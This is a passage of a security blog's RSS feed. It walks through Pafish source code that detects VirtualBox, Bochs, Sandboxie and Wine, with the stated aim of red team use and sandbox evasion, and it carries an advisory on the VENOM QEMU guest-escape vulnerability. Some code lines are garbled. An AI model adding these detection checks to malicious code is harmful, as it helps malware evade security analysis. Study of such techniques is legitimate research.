+	return pafish_exists_regkey_value_str(HKEY_LOCAL_MACHINE, &quot;HARDWARE\\DESCRIPTION\\System&quot;, &quot;SystemBiosDate&quot;, &quot;06/23/99&quot;);
+}
+</pre>
+<p>The names and the code is prety self explanatory. The code is mostly based on the functions pafish_exists_regkey_value_str() and pafish_exists_regkey() and it can be foud on utils.c. Basically, it uses <a title="RegOpenKeyEx()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx">RegOpenKeyEx()</a>. If the function finds the specified registry entry it will return ERROR_SUCCESS. Otherwise a value of nonzero will be returned. As stated on MSDN, the RegOpenKeyEx() function &#8220;opens the specified registry key. Note that key names are not case sensitive&#8221;.</p>
+<p>In the VirtualBox code there&#8217;s also some other interesting tricks. Like the function vbox_sysfile1(). This function basically looks for the presence of VirtualBox drivers installed on the system. See the code below:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int vbox_sysfile1(int writelogs) {
+	const int count = 4;
+	string strs1ount];
+	int res = FALSE, i = 0;
+	char message[200];
+
+	strs[0] = &quot;C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys&quot;;
+	strs[1] = &quot;C:\\WINDOWS\\system32\\drivers\\VBoxGuest.sys&quot;;
+	strs[2] = &quot;C:\\WINDOWS\\system32\\drivers\\VBoxSF.sys&quot;;
+	strs[3] = &quot;C:\\WINDOWS\\system32\\drivers\\VBoxVideo.sys&quot;;
+	for (i=0; i &lt; count; i++) {
+		if (pafish_exists_file(strs[i])) {
+			snprintf(message, sizeof(message)-sizeof(message[0]), &quot;VirtualBox traced using driver file %s&quot;, strs[i]);
+			if (writelogs) write_log(message);
+			res = TRUE;
+		}
+	}
+	return res;
+}
+</pre>
+<p>On the same line of thinking you can find the function vbox_sysfile2(). Which basically looks for the presence of specific VirtualBox DLLs. Here is the actual code:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int vbox_sysfile2(int writelogs) {
+	const int count = 14;
+	string strs1ount];
+	int res = FALSE, i = 0;
+	char message[200];
+
+	strs[0] = &quot;C:\\WINDOWS\\system32\\vboxdisp.dll&quot;;
+	strs[1] = &quot;C:\\WINDOWS\\system32\\vboxhook.dll&quot;;
+	strs[2] = &quot;C:\\WINDOWS\\system32\\vboxmrxnp.dll&quot;;
+	strs[3] = &quot;C:\\WINDOWS\\system32\\vboxogl.dll&quot;;
+	strs[4] = &quot;C:\\WINDOWS\\system32\\vboxoglarrayspu.dll&quot;;
+	strs[5] = &quot;C:\\WINDOWS\\system32\\vboxoglcrutil.dll&quot;;
+	strs[6] = &quot;C:\\WINDOWS\\system32\\vboxoglerrorspu.dll&quot;;
+	strs[7] = &quot;C:\\WINDOWS\\system32\\vboxoglfeedbackspu.dll&quot;;
+	strs[8] = &quot;C:\\WINDOWS\\system32\\vboxoglpackspu.dll&quot;;
+	strs[9] = &quot;C:\\WINDOWS\\system32\\vboxoglpassthroughspu.dll&quot;;
+	strs[10] = &quot;C:\\WINDOWS\\system32\\vboxservice.exe&quot;;
+	strs[11] = &quot;C:\\WINDOWS\\system32\\vboxtray.exe&quot;;
+	strs[12] = &quot;C:\\WINDOWS\\system32\\VBoxControl.exe&quot;;
+	strs[13] = &quot;C:\\program files\\oracle\\virtualbox guest additions\\&quot;;
+	for (i = 0; i &lt; count; i++) {
+		if (pafish_exists_file(strs[i])) {
+			snprintf(message, sizeof(message)-sizeof(message[0]), &quot;VirtualBox traced using system file %s&quot;, strs[i]);
+			if (writelogs) write_log(message);
+			res = TRUE;
+		}
+	}
+	return res;
+}
+</pre>
+<p>One of the tricks mostly common used is&#8230; yes, you guessed it. Check the MAC address identifier. Here&#8217;s the code that check&#8217;s for the OUI vendor:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int vbox_mac() {
+	/* VirtualBox mac starts with 08:00:27 */
+	return pafish_check_mac_vendor(&quot;\x08\x00\x27&quot;);
+}
+</pre>
+<p>The code for pafish_check_mac_vendor() can be found on the utils.c source file. Here&#8217;s the actual code:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int pafish_check_mac_vendor(char * mac_vendor) {
+	unsigned long alist_size = 0, ret;
+
+	ret = GetAdaptersAddresses(AF_UNSPEC,0,0,0,&amp;alist_size);
+	if(ret==ERROR_BUFFER_OVERFLOW) {
+		IP_ADAPTER_ADDRESSES* palist = (IP_ADAPTER_ADDRESSES*)LocalAlloc(LMEM_ZEROINIT,alist_size);
+		if(palist) {
+			GetAdaptersAddresses(AF_UNSPEC,0,0,palist,&amp;alist_size);
+			char mac[6]={0};
+			while (palist){
+				if (palist-&gt;PhysicalAddressLength==0x6){
+					memcpy(mac,palist-&gt;PhysicalAddress,0x6);
+					if (!memcmp(mac_vendor, mac, 3)) { /* First 3 bytes are the same */
+						LocalFree(palist);
+						return TRUE;
+					}
+				}
+				palist = palist-&gt;Next;
+			}
+			LocalFree(palist);
+		}
+	}
+	return FALSE;
+}
+</pre>
+<p>There are a few more tricks on the vbox.c file that shouldn&#8217;t be ignored, but I&#8217;ll ignore them for now.</p>
+<p>As you can imagine most of the code used to fingerprint VirtualBox is used in almost identical fashion to fingerprint VMware and Qemu.Basically, the code looks for specific Windows Registry keys, specific file paths, drivers and MAC vendor.</p>
+<h2>bochs.c</h2>
+<p>One neat idea we spotted in terms of how Pafish fingerprints Bochs was to play with CPU specific featurs that are present in Bochs but not real CPU.</p>
+<p>For example:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int bochs_cpu_amd1() {
+	char cpu_brand[49];
+	cpu_write_brand(cpu_brand);
+	/* It checks the lowercase P in 'processor', an actual AMD returns Processor */
+	return !memcmp(cpu_brand, &quot;AMD Athlon(tm) processor&quot;, 24) ? TRUE : FALSE;
+}
+
+int bochs_cpu_amd2() {
+	int eax;
+	__asm__ volatile(&quot;.intel_syntax noprefix;&quot;
+			&quot;xor eax, eax;&quot;
+			&quot;cpuid;&quot;
+			&quot;cmp ecx, 0x444d4163;&quot; /* AMD CPU? */
+			&quot;jne b2not_detected;&quot;
+			&quot;mov eax, 0x8fffffff;&quot; /* query easter egg */
+			&quot;cpuid;&quot;
+			&quot;jecxz b2detected;&quot; /* ECX value not filled */
+			&quot;b2not_detected: xor eax, eax; jmp b2exit;&quot;
+			&quot;b2detected: mov eax, 0x1;&quot;
+			&quot;b2exit: nop;&quot;
+			&quot;.att_syntax;&quot;
+			: &quot;=a&quot;(eax));
+	return eax ? TRUE : FALSE;
+}
+
+int bochs_cpu_intel1() {
+	char cpu_brand[49];
+	cpu_write_brand(cpu_brand);
+	/* This processor name is not known to be valid in an actual CPU */
+	return !memcmp(cpu_brand, &quot;              Intel(R) Pentium(R) 4 CPU        &quot;, 47) ? TRUE : FALSE;
+}
+</pre>
+<p>The first and third functions bochs_cpu_amd1() and bochs_cpu_intel1() will check for typos in the processor CPU string, whilst the second, bochs_cpu_amd2() triggers an assembly level easter egg that is present in the Bochs x86 CPU emulation.</p>
+<h2>cuckoo.c</h2>
+<p>Cuckoo is an open source project and the hooks it implements are known. The code you can find on cuckoo.c is quite small and basically plays with <a title="Cuckoo TLS_HOOK_INFO" href="https://github.com/cuckoosandbox/cuckoomon/blob/master/old/hooking.c">Cuckoo TLS_HOOK_INFO</a>. As a side note don&#8217;t forget that most Cuckoo set-ups use VirtualBox.</p>
+<h2>sandboxie.c</h2>
+<p>The trick to detect <a title="Sandboxie" href="http://www.sandboxie.com/">Sandboxie</a> is quite simple:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int sboxie_detect_sbiedll() {
+	if (GetModuleHandle(&quot;sbiedll.dll&quot;) != NULL) {
+		return TRUE;
+	}
+	else {
+		return FALSE;
+	}
+}
+</pre>
+<p>As you can see the function above tries to load the Sandboxie specific DLL called sbiedll.dll. If it succeeds Sandboxie is installed in the systems. Otherwise it is not. Pretty small test but quite effective.</p>
+<h2>wine.c</h2>
+<p>The code to detect the Wine environment is also quite small. The first function is wine_detect_get_unix_file_name():</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int wine_detect_get_unix_file_name() {
+	HMODULE k32;
+	k32 = GetModuleHandle(&quot;kernel32.dll&quot;);
+	if (k32 != NULL) {
+		if (GetProcAddress(k32, &quot;wine_get_unix_file_name&quot;) != NULL) {
+			return TRUE;
+		}
+		else {
+			return FALSE;
+		}
+	}
+	else {
+		return FALSE;
+	}
+}
+</pre>
+<p>It starts by getting an handle to the kernel32.dll and then calling the <a title="GetProcAddress()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx">GetProcAddress()</a> to retrieve the address of the function/variable wine_get_unix_file_name exported and available in the kernel32.dll. If the function succeeds it will return the address of the exported function, otherwise it will return NULL. Meaning that if doesn&#8217;t return NULL Wine has been fingerprinted and the wine_detect_get_unix_file_name returns TRUE.</p>
+<p>The other function that Pafish implements is shown below:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+int wine_reg_key1() {
+	return pafish_exists_regkey(HKEY_CURRENT_USER, &quot;SOFTWARE\\Wine&quot;);
+}
+</pre>
+<p>Nothing new here, wine_reg_key1 simply looks for the presence of a Windows Registry key.</p>
+<h2>Conclusion</h2>
+<p>This short introduction to Pafish code was meant to evaluate how the code can be applied to our Red Team Exercises. Since the code/checks are not too advanced and in some cases can be completely fooled, the code should be tweaked if we want to use it in our engagements. It also doesn&#8217;t make sense to include all the checks blindly, which means a good information gathering phase must be assured before any &#8220;red team&#8221; exercise.</p>
+<p>Anyway these different methods of checking whether the program is running under a debugger, Virtual Machine or a sandbox might be quite useful if we want to develop code for a specific environment. Looking at Pafish code certainly improves our knowledge about how to bypass some sandboxes.</p>
+<p>Based on the code I&#8217;ve read, the most common ways to identify that we are running in a virtualized environment (running inside a debugger is not that useful to us) are:</p>
+<ul>
+<li>Registry checks</li>
+<li>Memory checks</li>
+<li>Communication checks (with the host)</li>
+<li>Process and file checks</li>
+<li>Hardware</li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/sandbox-detection-pafish-overview/">Sandbox detection: Pafish overview</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/sandbox-detection-pafish-overview/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>VENOM vulnerability</title>
+		<link>https://labs.portcullis.co.uk/blog/venom-vulnerability/</link>
+		<comments>https://labs.portcullis.co.uk/blog/venom-vulnerability/#comments</comments>
+		<pubDate>Thu, 14 May 2015 10:12:24 +0000</pubDate>
+		<dc:creator><![CDATA[RFR]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5134</guid>
+		<description><![CDATA[<p>VENOM (Virtualised Environment Neglected Operations Manipulation) is a vulnerability that could allow an attacker to escape a guest virtual machine and access the host system, along with other virtual machines running on this system, and access their data. This could potentially allow an attacker to steal sensitive data on any of these virtual machines and [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/venom-vulnerability/">VENOM vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>VENOM (Virtualised Environment Neglected Operations Manipulation) is a vulnerability that could allow an attacker to escape a guest virtual machine and access the host system, along with other virtual machines running on this system, and access their data. This could potentially allow an attacker to steal sensitive data on any of these virtual machines and gain elevated access to the host’s local network and its systems.<span id="more-5134"></span></p>
+<p>VENOM (<a title="CVE-2015-3456" href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3456">CVE-2015-3456</a>) takes advantage of the floppy drive emulation code of the open-source hypervisor QEMU, installed by default in a number of virtualisation infrastructures such as Xen hypervisors, the QEMU client, and Kernel-based Virtual Machine (KVM).</p>
+<h2>What is it?</h2>
+<p>VENOM (Virtualised Environment Neglected Operations Manipulation) is a vulnerability that could allow an attacker to escape a guest virtual machine and access the host system, along with other virtual machines running on this system, and access their data. This could potentially allow an attacker to steal sensitive data on any of these virtual machines and gain elevated access to the host’s local network and its systems.</p>
+<p>VENOM takes advantage of the floppy drive emulation code of the open-source hypervisor QEMU, installed by default in a number of virtualisation infrastructures such as Xen hypervisors, the QEMU client, and Kernel-based Virtual Machine (KVM)</p>
+<h2>What does it expose?</h2>
+<p>The successful exploitation of VENOM could result in arbitrary code execution in the context of the host and leads to breaking out of a guest machine and into the host system. To exploit this bug, user level access to a guest virtual machine, with sufficient permissions to talk to FDC I/O ports, is required. This means that the root user, or any other privileged user may exploit this bug.</p>
+<p>VENOM can expose:</p>
+<ul>
+<li> Any neighboring guests</li>
+<li>The host operating system</li>
+<li>The host local network</li>
+</ul>
+<p>At the time of this writing, there was already a public Proof of Concept <a href="https://marc.info/?l=oss-security&amp;m=143155206320935&amp;w=2">available,</a> which means that a public exploit can soon be released. Note that the use of the PoC release may still be useful to an attacker, as it may enable them to crash the hypervisor.</p>
+<h2>Who/What is affected?</h2>
+<p>Floppy disks are an obsolete technology, however many virtualisation products add a virtual floppy drive to VMs by default, which exposes VMs to the bugs that may exist in the Floppy Disk Controller (FDC). Besides, to exploit this vulnerability a floppy device, present in /dev/ within the guest, is not required because the Floppy Disk Controller is still present in the system.</p>
+<p>As far as Portcullis is aware, the vulnerable technology is enabled in Xen, QEMU, FireEye’s hypervisor, and KVM by default. VMware, Microsoft Hyper-V, and Bochs hypervisors are not vulnerable. Oracle’s VirtualBox default installation shouldn&#8217;t be vulnerable by default, since the Floppy Disk Controller is optional. It is important to note that Amazon Web Services customers are not affected, however many other hosting platforms may be vulnerable.</p>
+<h2>What should we do?</h2>
+<p>There are no reports of any attackers actively exploiting this vulnerability yet. QEMU and other vendors were informed of the bug prior to its disclosure and have already released patches to fix the issue.</p>
+<p>Portcullis recommends an upgrade to the latest version/patch of your virtualisation software, and checking for information from your vendor. In addition to this, if you are a cloud provider customer check if they have applied a patch for the VENOM vulnerability. Administrators of VM systems who rely on Xen, KVM, or the native QEMU client should apply the VENOM patches as soon as possible. If your organisation operates an affected virtualisation infrastructure for external customers, you should patch immediately.</p>
+<p>To mitigate the overall risk of this vulnerability, only grant privileged guest access to trusted users.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/venom-vulnerability/">VENOM vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/venom-vulnerability/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
